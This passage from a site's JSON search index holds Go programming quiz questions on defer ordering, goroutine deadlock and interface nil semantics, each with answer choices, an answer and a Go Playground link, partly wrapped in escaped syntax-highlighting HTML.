style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e = \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/zkp1U4vSmqO\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e2\n1\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edefer4\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eelem\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrint\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eelem\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003etemp\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e).\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ett\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eAdd\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 132\u003c/li\u003e\n\u003cli\u003eB. 123\u003c/li\u003e\n\u003cli\u003eC. 312\u003c/li\u003e\n\u003cli\u003eD. 321\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/Y1rR4UK8AOh\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eA\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Defer"},{"categories":null,"contents":" goroutine package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { ch1 := make(chan int) go fmt.Println(\u0026lt;-ch1) ch1 \u0026lt;- 5 time.Sleep(1 * time.Second) } A. 5 B. deadlock C. compilation error Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/goroutine/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egoroutine\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSleep\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 5\u003c/li\u003e\n\u003cli\u003eB. deadlock\u003c/li\u003e\n\u003cli\u003eC. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/FsQsswPtOpp\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Goroutine"},{"categories":null,"contents":" interface package main import ( \u0026#34;fmt\u0026#34; ) type People interface { Show() } type Student struct{} func (stu *Student) Show() {} func live() People { var stu *Student return stu } func main() { if live() == nil { fmt.Println(\u0026#34;AAAAAAA\u0026#34;) } else { fmt.Println(\u0026#34;BBBBBBB\u0026#34;) } } Answer Try it BBBBBBB interface1 package main import ( \u0026#34;fmt\u0026#34; ) type People interface { Speak(string) string } type Student struct{} func (stu *Student) Speak(think string) (talk string) { if think == \u0026#34;love\u0026#34; { talk = \u0026#34;You are a good boy\u0026#34; } else { talk = \u0026#34;hi\u0026#34; } return } func main() { var peo People = Student{} think := \u0026#34;love\u0026#34; fmt.Println(peo.Speak(think)) } Answer Try it compilation error cannot use Student{} (value of type Student) as People value in variable declaration: Student does not implement People (method Speak has pointer receiver) interface2 package main import \u0026#34;fmt\u0026#34; type T1 struct { String func() string } func (T1) Error() string { return \u0026#34;T1.Error\u0026#34; } type T2 struct { Error func() string } func (T2) String() string { return \u0026#34;T2.String\u0026#34; } var t1 = T1{String: func() string { return \u0026#34;T1.String\u0026#34; }} var t2 = T2{Error: func() string { return \u0026#34;T2.Error\u0026#34; }} func main() { fmt.Println(t1.Error(), t1.String()) fmt.Println(t2.Error(), t2.String()) fmt.Println(t1, t2) } Answer Try it T1.Error T1.String T2.Error T2.String T1.Error T2.String interface3 package main import \u0026#34;fmt\u0026#34; func main() { var p [100]int var m interface{} = [...]int{99: 0} fmt.Println(p == m) } Answer Try it true ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/interface/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eShow\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eShow\u003c/span\u003e() {}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elive\u003c/span\u003e() \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elive\u003c/span\u003e() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;AAAAAAA\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;BBBBBBB\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/2nBU-dMwW6b\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eBBBBBBB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003einterface1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003estu\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) (\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;love\u0026#34;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;You are a good boy\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t} \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003etalk\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hi\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003epeo\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePeople\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003eStudent\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;love\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003epeo\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSpeak\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ethink\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/7SFsQFsd2YJ\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003ecompilation error\ncannot use Student{} (value of type Student) as People value in variable declaration: Student does not implement People (method 